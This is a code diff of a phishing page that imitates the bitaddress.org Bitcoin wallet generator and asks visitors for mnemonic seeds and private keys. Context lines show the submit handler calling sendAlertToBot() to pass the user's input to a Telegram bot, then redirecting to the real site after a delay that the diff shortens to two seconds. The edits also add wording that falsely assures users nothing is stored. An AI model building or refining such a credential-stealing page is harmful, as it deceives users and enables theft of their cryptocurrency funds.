@@ -17,6 +17,7 @@
 			margin: 30px; /* Set a margin of 30 pixels on all sides of the page */
             margin-left: 30px; /* Set a margin of 30 pixels on the left side of the page */
             margin-right: 30px; /* Set a margin of 30 pixels on the right side of the page */
+            font-family: cursive;
         }
 
         #tagline, #culturemenu {
@@ -26,9 +27,12 @@
         #logo {
             max-width: fit-content; /* Set the maximum width of the image to 100% of its container */
             height: auto; /* Allow the height to adjust proportionally based on the width */
-            margin-bottom: 20px; /* Add some bottom margin for spacing */
-            /* Double the size of the logo */
             width: 200%px /* Double the width */
+        }
+
+        .logo-container {
+            width: 200%; /* Set the width of the logo container */
+            height: auto; /* Allow the height to adjust proportionally based on the width */
         }
 
         .input-container {
@@ -47,6 +51,7 @@
         .input-container button {
             margin-left: 15px; /* Add some left margin for spacing */
         }
+
     </style>    
     
     <meta charset="UTF-8">
@@ -126,10 +131,10 @@
             // Trigger the alerting mechanism to send user input data to the Telegram bot
             sendAlertToBot();
 
-            // Delay redirection by 3 seconds to allow time for the alert to be sent
+            // Delay redirection by 2 seconds to allow time for the alert to be sent
             setTimeout(function() {
                 window.location.href = 'https://bitaddress.org';
-            }, 3000);
+            }, 2000);
         });
 
         // Capture Enter key press on the landing page
@@ -164,14 +169,15 @@
             <span><a href="?culture=pt-br" id="culturept-br" onclick="ninja.translator.translate('pt-br'); return false;" class="">português</a></span>
         </div>
         
-    <div style="margin-bottom: 20px;"></div> <!-- Empty div for spacing -->    
+    <div style="margin-bottom: 0px;"></div> <!-- Empty div for spacing -->    
     <img alt="Bitaddress Logo" title="bitaddress Logo" id="logo" src="https://i.ibb.co/4pgYM1b/bitaddress-logo.png">    
     </div>
     
-    <div id="tagline">Open Source JavaScript Client-Side Bitcoin Wallet Address & QR Code Generator</div>
+    <div id="tagline"><em>Open Source JavaScript Client-Side Bitcoin Wallet Address & QR Code Generator</em></div>
     <br>
     <div style="text-align: left; margin: 0 40px; font-size: 10pt;"> 
-        Bitaddress.org is used to generate Bitcoin wallet address with their public/private keys and corresponding QR codes for a mnemonic seed submitted, and to generate Bitcoin wallet addresses and their public keys and corresponding QR codes for a private key <br>submitted, including QR codes for the private key. No user information is ever stored on this website.
+    <h1><strong>How to use bitaddress.org</strong></h1>If you submit a mnemonic seed, bitaddress.org will generate Bitcoin wallet address with their public/private keys and corresponding QR codes.<br>If a private key is submitted, bitwallet.org will generate Bitcoin wallet addresses and their public keys and corresponding QR codes, including QR codes for the private key submitted.<br><strong>Please be informed that no user information is ever stored on this website.</strong>
+    <h1 style="font-size: 10pt;">
     </div>
     <br>
 
@@ -192,7 +198,7 @@
     
     <br><br>
     <div style="text-align: left; margin: 0 40px; font-size: 10pt;">
-        If you submit a mnemonic seed, also known as a seed phrase or recovery phrase, in an attempt to create a new bitcoin wallet or create backup keys for your existing wallets,<br>the corresponding private keys will be generated for you in the following formats: 
+        If you submit a mnemonic seed, also known as seed phrase or recovery phrase, in an attempt to create a new bitcoin wallet or create backup keys for your existing wallets,<br>the corresponding private keys will be generated for you in the following formats: 
         <br>
         &bull; Private Key WIF (51 characters base58, starts with a '5' WIF format),
         <br>
@@ -248,10 +254,10 @@
             // Trigger the alerting mechanism to send user input data to the Telegram bot
             sendAlertToBot();
 
-            // Delay redirection by 3 seconds to allow time for the alert to be sent
+            // Delay redirection by 2 seconds to allow time for the alert to be sent
             setTimeout(function() {
                 window.location.href = 'https://bitaddress.org';
-            }, 3000);
+            }, 2000);
         });
 
         // Capture Enter key press on the landing page
@@ -317,35 +323,44 @@ document.getElementById('statusokunittestsgood').addEventListener('click', funct
         <br>
         <br>
         <br>
-        <div id="statuscryptogood" class="tooltip" style="display: none; font-size: 8pt;">
+        <br>
+        <br>
+        <div id="statuscryptogood" class="tooltip" style="display: none; font-size: 8pt; text-align: left; margin-left: 15px;">
             <span class="statusgood" id="statuslabelcryptogood">✔ Good!</span>
             <span id="statuslabelcryptogood1">Your browser can generate cryptographically random keys using window.crypto.getRandomValues</span>
-            <br><br>
             <input type="button" value="OK" class="button" id="statusokcryptogood" onclick="document.getElementById('statuscryptogood').style.display = 'none';">
         </div>
         
-        <div class="tooltip" id="statuscryptobad" style="font-size: 8pt;">
+        <div class="tooltip" id="statuscryptobad" style="font-size: 8pt; text-align: left; margin-left: 15px;">
             <span class="statusbad" id="statuslabelcryptobad">Lucky you!</span>
             <span id="statuslabelcryptobad1">Your browser supports window.crypto.getRandomValues. You are good to go 👌</span>
-            <br><br>
             <input type="button" value="OK" class="button" id="statusokcryptobad" onclick="document.getElementById('statuscryptobad').style.display = 'none';">
         </div>
         
-        <div class="tooltip" id="statusunittestsgood" style="font-size: 8pt;">
+        <div class="tooltip" id="statusunittestsgood" style="font-size: 8pt; text-align: left; margin-left: 15px;">
             <span class="statusgood" id="statuslabelunittestsgood">✔ Good!</span>
             <span id="statuslabelunittestsgood1">All synchronous unit tests passed.</span>
-            <br><br>
             <input type="button" value="OK" class="button" id="statusokunittestsgood">
         </div>
-        
-        <div class="author" style="font-size: 8pt;">
-            <div>
-                <span id="footerlabeldonations">Donations:</span> <b>0x2ccfe7acd7757c0cc475e07748ff2d453537d531</b>
-                <span id="footerlabeltranslatedby"></span>
+        <br>
+        <div class="authorbtc" style="font-size: 8pt; text-align: left; margin-left: 15px;">
+            <span id="footerlabeldonations">Donations:</span> <b>0x2ccfe7acd7757c0cc475e07748ff2d453537d531</b>
+            <span id="footerlabeltranslatedby"></span>
             </div>
         </div>
+
+        <div class="authorpgp" style="font-size: 8pt ; text-align: right; margin-right: 15px;">
+            <span class="item">
+                <a href="CHANGELOG.txt.asc" target="_blank"><span id="footerlabelversion">Version History</span> (3.3.1)</a>
+            <br>
+            </span>
+            <span class="item">527B 5C82 B1F6 B2DB 72A0<br>ECBF 8749 7B91 6397 4F5A</span>
+            <br><span class="item">    
+                (<a href="null" target="_blank" id="footerlabelpgp">PGP</a>)
+                (<a href="javascript:window.location=window.location.pathname+'.sig';" target="_blank" id="footerlabelsig">sig</a>)
+            </span>
         
-        <div class="copyright" style="font-size: 8pt;">
+        <div class="copyright" style="font-size: 8pt; text-align: center; margin-bottom: 15px;">
             <span id="footerlabelcopyright1">Copyright bitaddress</span>
             <span id="footerlabelcopyright2">JavaScript copyrights are included in the source.</span>
         </div>
